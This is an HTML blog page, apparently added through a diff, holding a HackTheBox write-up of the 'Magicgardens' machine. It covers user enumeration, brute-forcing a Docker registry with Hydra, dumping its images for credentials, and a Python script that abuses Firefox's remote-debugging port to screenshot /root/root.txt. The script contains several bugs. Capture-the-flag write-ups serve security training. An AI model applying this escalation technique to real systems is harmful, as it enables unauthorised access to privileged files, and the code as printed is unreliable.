@@ -1,0 +1,496 @@
+<!DOCTYPE html>
+<html class="direction--ltr"lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Magicgardens 0eff0627d5364a36aa38d148d2256c53 | Pwn3d777</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Magicgardens 0eff0627d5364a36aa38d148d2256c53" />
+<meta name="author" content="GitHub User" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Magicgardens" />
+<meta property="og:description" content="Magicgardens" />
+<link rel="canonical" href="https://your-site-url/writeups/2025/07/11/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9.html" />
+<meta property="og:url" content="https://your-site-url/writeups/2025/07/11/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9.html" />
+<meta property="og:site_name" content="Pwn3d777" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2025-07-11T16:05:57+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Magicgardens 0eff0627d5364a36aa38d148d2256c53" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"GitHub User"},"dateModified":"2025-07-11T16:05:57+00:00","datePublished":"2025-07-11T16:05:57+00:00","description":"Magicgardens","headline":"Magicgardens 0eff0627d5364a36aa38d148d2256c53","mainEntityOfPage":{"@type":"WebPage","@id":"https://your-site-url/writeups/2025/07/11/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9.html"},"url":"https://your-site-url/writeups/2025/07/11/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" />
+  <link rel="stylesheet" href="/assets/css/magnific-popup.css"><link type="application/atom+xml" rel="alternate" href="https://your-site-url/feed.xml" title="Pwn3d777" /><script src="https://code.jquery.com/jquery-3.2.0.min.js"></script> 
+  <script src="/assets/js/jquery.magnific-popup.js"></script>
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pwn3d777<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        
+        
+        <a class="color-cyan-hover" href="https://twitter.com/bitbrain_"><i class="fab fa-twitter-square"></i></a>
+        
+        
+        
+        <a class="color-red-hover" href="https://bitbrain.itch.io"><i class="fab fa-itch-io"></i></a>
+        
+        
+        
+        <a class="color-purple-hover" href="https://github.com/bitbrain"><i class="fab fa-github-square"></i></a>
+        
+        
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+
+<div class="description">This is my blog, here you will find more information about me, in addition to my work on HackTheBox and some interesting apps i've developed
+</div>
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Magicgardens 0eff0627d5364a36aa38d148d2256c53</h1>
+  
+  <div class="post-date">
+    Published on 11 Jul 2025
+    
+  </div>
+  
+  <h1 id="magicgardens">Magicgardens</h1>
+
+<h1 id="1-enumeration">1. Enumeration</h1>
+
+<p>We started with port enumeration with nmap</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled.png" alt="Untitled" /></p>
+
+<p>We’ve found the domain name associted, and we realized there’s a flower ecommerce, alse there are other ports like 25 or 5000 which we can explore later</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_1.png" alt="Untitled" /></p>
+
+<p>We proceed to sign up</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_2.png" alt="Untitled" /></p>
+
+<p>There is something interesting right here, is we create 2 users we will be able to discover a pattern in server response, to find that pattern we will focus on Username and Email input. We are able to enumerate all web application users as follow:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Username</th>
+      <th>Email</th>
+      <th>Server response</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Valid username</td>
+      <td>Valid email</td>
+      <td>200</td>
+    </tr>
+    <tr>
+      <td>valid username</td>
+      <td>Invalid email</td>
+      <td>200</td>
+    </tr>
+    <tr>
+      <td>Invalid username</td>
+      <td>valid email</td>
+      <td>500</td>
+    </tr>
+    <tr>
+      <td>Invalid username</td>
+      <td>Invalid email</td>
+      <td>200</td>
+    </tr>
+  </tbody>
+</table>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_3.png" alt="Untitled" /></p>
+
+<p>To automate the enumeration we will compare different usernames with a valid email</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_4.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_5.png" alt="Untitled" /></p>
+
+<h1 id="2-user-flag">2. User flag</h1>
+
+<p>Unfortunately we didn’t find any username so we continue user enumeration, we found some directories</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_6.png" alt="Untitled" /></p>
+
+<p>A login page could be useful</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_7.png" alt="Untitled" /></p>
+
+<p>We haven’t forget other ports, we have mailing server running, we can enumerate user’s here due to the valid commands shown in nmap scan,</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_8.png" alt="Untitled" /></p>
+
+<p>Depending of the size of the dictionary it could take so much time</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_9.png" alt="Untitled" /></p>
+
+<p>we already have a user</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_10.png" alt="Untitled" /></p>
+
+<p>Let’s enumerate web application service running on port 5000</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_11.png" alt="Untitled" /></p>
+
+<p>There are some a authentication directoty we may use the username found before</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_12.png" alt="Untitled" /></p>
+
+<p>As we known on port 5000 there is a docker https server</p>
+
+<p>Hydra</p>
+
+<p>Hydra can perform fast fictionary attacks againts mora than 50 protocolos, including <code class="language-plaintext highlighter-rouge">telnet -FTP - HTTP - HTTPS - SMB</code></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_13.png" alt="Untitled" /></p>
+
+<p>A valid password was found, and we can see there’s a some repositories there</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_14.png" alt="Untitled" /></p>
+
+<p><a href="https://github.com/Syzik/DockerRegistryGrabber">DockerRegistryGrabber</a> is a Python tool for enumerating/dumping Docker repositories without or with basic authentication.</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_15.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_16.png" alt="Untitled" /></p>
+
+<p>Environment variables? that’s useful, but first check sqlite database</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_17.png" alt="Untitled" /></p>
+
+<p>Morty credentials!!</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_18.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_19.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_20.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_21.png" alt="Untitled" /></p>
+
+<h1 id="3priv-esc">3.Priv esc</h1>
+
+<p>Use linpeas to enumerate the whole system</p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_22.png" alt="Untitled" /></p>
+
+<ul>
+  <li><strong>firefox-esr</strong> This is the executable for Firefox Entended Support Release, which is stable version of Firefox that is update less frequently.</li>
+  <li><strong>—marionette</strong> This enables marionette protocol, which is an automation protocol for Firefox. Marionette allows controlling and automating interaction with Firefoz via remote client.</li>
+  <li><strong>—headless</strong> This option starts Firefox in headless mode, meaning no graphical Firefox windows will be opened.</li>
+  <li><em>*—remote-debugginport</em> This specifies the port which Firefox will listen for remote debugging requests. This is used when working with development tools that need to access the firefox instance for debugging or inspecting the loaded web page.</li>
+  <li><strong>—remote-allow-host</strong> This allow remote connections only from the <a href="http://localhost">localhost</a> (port forwarding needed)</li>
+  <li><strong>—no-remote</strong> This option specifies that no additional remote connections will be allowed.</li>
+  <li><strong>—profile /tmp/profile</strong> This specifies the user profile that Firefox will use when starting.</li>
+</ul>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_23.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_24.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_25.png" alt="Untitled" /></p>
+
+<p>With this information we will be able to run Firefox as debugger so with the following expoilt we cloud be able to find any file we want and take and screenshot of the open file</p>
+
+<p>In python</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">requests</span> 
+<span class="kn">import</span> <span class="nn">websocket</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+
+<span class="c1">#Debugger address
+</span><span class="n">debugger_address</span> <span class="o">=</span> <span class="s">'http://localhost:52735'</span>
+
+<span class="c1">#Perform a http request to get open windows on the browser
+</span><span class="n">response</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">debugger_address</span><span class="si">}</span><span class="s">/json'</span><span class="p">)</span>
+
+<span class="c1">#Analyze JSON answer to obtain information about windows
+</span><span class="n">tabs</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">json</span><span class="p">()</span>
+
+<span class="c1">#Get the websocket debugger url of the first window and replace 
+#'127.0.0.1' to 'localhost'
+</span><span class="n">web_socket_debugger_url</span> <span class="o">=</span> <span class="n">tabs</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="s">'webSocketDebuggerUrl'</span><span class="p">].</span><span class="n">replace</span><span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span><span class="s">'localhost'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Connect to url: </span><span class="si">{</span><span class="n">web_socket_debugger_url</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#Establishing connection 
+</span><span class="n">ws</span> <span class="o">=</span> <span class="n">websocket</span><span class="p">.</span><span class="n">create_connection</span><span class="p">(</span><span class="n">web_socket_debugger_url</span><span class="p">,</span> <span class="n">supress_origin</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+
+<span class="c1">#Preparing JSON command to create a new  (target) in the browser
+#Pointing a local file
+</span><span class="n">command</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
+	<span class="s">"id"</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
+	<span class="s">"method"</span><span class="p">:</span> <span class="s">"Target.createTarget"</span><span class="p">,</span>
+	<span class="s">"params"</span><span class="p">:{</span>
+		<span class="s">"url"</span><span class="p">:</span><span class="s">"file:///root/root.txt"</span>
+	<span class="p">}</span>
+<span class="p">})</span>
+
+<span class="c1">#Send the object to create the target
+</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+<span class="c1">#Receive the answer from websocket and extracts ID of the target
+</span><span class="n">target_id</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">())[</span><span class="s">'result'</span><span class="p">][</span><span class="s">'targetId'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'target id": </span><span class="si">{</span><span class="n">target_id</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#Prepare the JSON command to attach the target using its ID
+</span><span class="n">command</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
+	<span class="s">"id"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span>
+	<span class="s">"method"</span><span class="p">:</span> <span class="s">"Target.attachToTarget"</span><span class="p">,</span>
+	<span class="s">"params"</span><span class="p">:{</span>
+		<span class="s">"targetId"</span><span class="p">:</span> <span class="n">target_id</span><span class="p">,</span>
+		<span class="s">"flatten"</span><span class="p">:</span> <span class="bp">True</span>
+		
+	<span class="p">}</span>
+<span class="p">})</span>
+
+<span class="c1">#Send the command
+</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+<span class="c1">#Gets the answer and extracts ID session attached
+</span><span class="n">session_id</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">())[</span><span class="s">'params'</span><span class="p">][</span><span class="s">'sessionId'</span><span class="p">]</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'Session id: </span><span class="si">{</span><span class="n">session_id</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1">#prepare the command to take a screenshot
+</span>
+<span class="n">command</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span>
+	<span class="s">"id"</span><span class="p">:</span><span class="mi">5</span><span class="p">,</span>
+	<span class="s">"sessionId"</span> <span class="n">session_id</span><span class="p">,</span>
+	<span class="s">"method"</span><span class="p">:</span> <span class="s">"Page.captureScreenshot"</span><span class="p">,</span>
+	<span class="s">"params"</span><span class="p">:</span> <span class="p">{</span>
+		<span class="s">"sessionId"</span><span class="p">:</span> <span class="n">session_id</span><span class="p">,</span>
+		<span class="s">"format"</span><span class="p">:</span><span class="s">"png"</span>
+	<span class="p">}</span>
+<span class="p">})</span>
+
+<span class="c1">#Send the command
+</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+<span class="c1">#Gets the answer which contains the screenshot in base64
+</span><span class="n">result</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">.</span><span class="n">recv</span><span class="p">())</span>
+
+<span class="c1">#Send the command again it seems to be neccesary
+</span><span class="n">ws</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+<span class="c1">#Loads the screenshot
+</span><span class="n">result</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">ws</span><span class="p">())</span>
+
+<span class="c1">#Verify if the screenshot was successfull
+</span><span class="k">if</span> <span class="s">'result'</span> <span class="ow">in</span> <span class="n">result</span> <span class="ow">and</span> <span class="s">'data'</span> <span class="ow">in</span> <span class="n">result</span><span class="p">[</span><span class="s">'result'</span><span class="p">]:</span>
+	<span class="k">print</span><span class="p">(</span><span class="s">"Success file reading"</span><span class="p">)</span>
+	<span class="c1">#If it is succesfull decode and save the file
+</span>	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"root.png"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+		<span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">result</span><span class="p">[</span><span class="s">'result'</span><span class="p">][</span><span class="s">'data'</span><span class="p">]))</span>
+<span class="k">else</span><span class="p">:</span> 
+	<span class="k">print</span><span class="p">(</span><span class="s">"Error"</span><span class="p">)</span>
+	
+<span class="n">ws</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>In bash</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+</code></pre></div></div>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_26.png" alt="Untitled" /></p>
+
+<p><img src="/assets/images/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9_Untitled_27.png" alt="Untitled" /></p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'https://your-site-url/writeups/2025/07/11/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9.html';
+     this.page.identifier = '/writeups/2025/07/11/28f49904-02f6-4708-8461-b5ad886b164c-export-15d17823-fef8-4466-bcf6-f19e78910ad9';
+     this.page.title = 'Magicgardens 0eff0627d5364a36aa38d148d2256c53';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//<your-disqus-shortname>.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/ffa4a87e-38af-497f-af3d-e8e50cfff51d-export-1b877186-ee75-440e-b2af-33e8bf6b294e.html">
+            Dog 207b952552918059ae99cbb25a8392ef
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/79cfbba1-5d00-4be3-9024-410aeb127310-export-17230101-c486-4db1-a5be-7f8c4dbff5b9.html">
+            Titanic 1eab9525529180a9b52fc9a7eb126a50
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/writeups/2025/07/17/3fc8f489-853a-4ea0-889d-236b8ffbdd66-export-385386b7-9fb2-4b18-adf5-1f5d9827dceb.html">
+            Cat 1abb9525529180ae82d4f25f2121346a
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+<script>
+  let i = 0;
+  const text = '';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+
+  // Image modal
+  var $imgs = [];
+  $('img').each(function(idx) {
+    var obj = {
+      src: $(this).attr('src')
+    }
+    $imgs.push(obj);
+    var elem = $(this);
+    $(this).click(function() {
+      $('.modal').magnificPopup('open', idx);
+    });
+  });
+
+  $('.modal').magnificPopup({
+    items: $imgs,
+    type: 'image',
+    closeOnContentClick: true,
+    mainClass: 'mfp-img-mobile',
+    image: {
+      verticalFit: true
+    }
+    
+  });
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
